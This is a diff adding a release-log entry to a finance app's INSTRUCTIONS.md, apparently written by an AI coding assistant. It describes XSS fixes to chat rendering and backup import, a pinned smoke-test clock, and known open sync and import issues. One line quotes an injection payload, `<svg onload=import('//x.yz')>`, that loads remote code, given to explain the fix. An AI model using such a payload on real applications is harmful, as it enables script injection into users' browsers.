@@ -1,3 +1,36 @@
+# v74.04 entry (prepended to INSTRUCTIONS.md)
+## 2026-11-10 - "in my finance app repo, hunt for bugs and redflags, and report back to me" -> (report given) -> "ok" (fix #1 + #2) -> "ok" (commit, release, push) -> "Fix test + install Python"
+Status: **done** - commit (this one, one-commit release) with SHELL_RELEASE 74.04, sw cache
+finances-pwa-v74.04 pushed to https://github.com/jblagana/finance-app.git (main).
+
+Interpretation: ship the two security fixes from the review as one dot
+release; first make the gates able to go green (Python was not installed on
+this PC; the app smoke was red on the wall clock before any change).
+
+Fix:
+- chat.js actionsHtml: `esc(a.label)` — the coach's draft-change buttons
+  carried model text unescaped (nm() only trims/caps at 40 chars, enough for
+  `<svg onload=import('//x.yz')>`), and the row is persisted, so it re-ran on
+  every chat open.
+- app.js sanitizeChatRows -> sanitizeChatHtml: an imported backup's bot html
+  is rebuilt from an allow-list (div/span/b/i/br, class only) via an inert
+  DOMParser; no parser -> plain escaped text. Verified in headless Edge against
+  img-onerror / svg-onload / script / iframe-srcdoc / javascript: links /
+  attribute-quote breakouts: nothing ran, the app's own messages came out
+  byte-identical.
+- smoke_app_v68.js: the clock is PINNED (shifted, still ticking) to
+  SMOKE_NOW, default 2026-11-06 12:00 — the middle of the all-green window
+  (Nov 5-7 verified; Oct 14 / Oct 20 / Oct 28 / Nov 1 / Nov 4 / Nov 8 are red).
+  On the wall clock v73.54 crashed the run, so every PART after it had
+  silently stopped running. SMOKE_NOW=real restores the wall clock.
+- smoke PART 46 (5 asserts) + check_site v74.04 pin.
+
+Still open from the review (not in this release): the Worker's Origin check
+is spoofable (no rate limit -> quota drain); sync merge drops txn edits
+(merged by `created`), never syncs owed (no `owed.edited`), resurrects local
+deletes on pull, and replaces the money log wholesale; import accepts txns
+unvalidated and drops a whole owed person on one bad entry.
+
 # v73.87 entry (prepended to INSTRUCTIONS.md)
 ## 2026-11-02 - "i reconcile maya cc balance to 2700 -> total cash goes back to original 10000; the correct behavior is for total cash to go 8600" -> "Approve the fix (card-branch debit re-anchor + pre-save smoke pin)"
 Status: **done** - commit (this one, one-commit release) with SHELL_RELEASE 73.87, sw cache
